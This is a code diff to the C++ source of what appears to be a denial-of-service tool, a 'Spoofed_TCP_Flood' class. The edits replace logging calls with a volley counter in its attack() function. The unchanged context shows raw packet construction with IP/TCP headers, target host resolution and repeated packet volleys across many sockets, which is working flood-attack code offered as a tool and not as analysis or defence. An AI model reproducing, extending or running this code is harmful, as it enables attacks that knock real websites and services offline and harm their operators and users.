@@ -8,15 +8,15 @@
 #include <utility>
 #include "../Headers/Randomizer.hpp"
 #include "../Headers/Spoofed_TCP_Flood.hpp"
+#include "../Headers/Logging.hpp"
 
-void Spoofed_TCP_Flood::attack(const int *id) {
+void Spoofed_TCP_Flood::attack() {
     int r;
     std::vector<int> sockets;
     sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.emplace_back(0);
     }
-    std::string message{};
     char buf[8192], *pseudogram;
     struct pseudo_header psh{};
     auto *ip = (struct iphdr *) buf;
@@ -32,7 +32,7 @@ void Spoofed_TCP_Flood::attack(const int *id) {
 
             if((hp = gethostbyname(conf->website.c_str())) == nullptr){
                 if((ip->daddr = inet_addr(conf->website.c_str())) == -1){
-                    conf->logger->Log("Can't resolve the host", Logger::Error);
+                    print_error("Can't resolve the host");
                     exit(EXIT_FAILURE);
                 }
             }else{
@@ -73,17 +73,12 @@ void Spoofed_TCP_Flood::attack(const int *id) {
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_TCP);
             }else{
-                message = std::string("Socket[") + std::to_string(x) + "->"
-                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                conf->logger->Log(&message, Logger::Info);
-                message = std::to_string(*id) + ": Voly Sent";
-                conf->logger->Log(&message, Logger::Info);
+                conf->voly++;
             }
 
             delete pseudogram;
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        conf->logger->Log(&message, Logger::Info);
+        conf->voly++;
         pause();
     }
 }
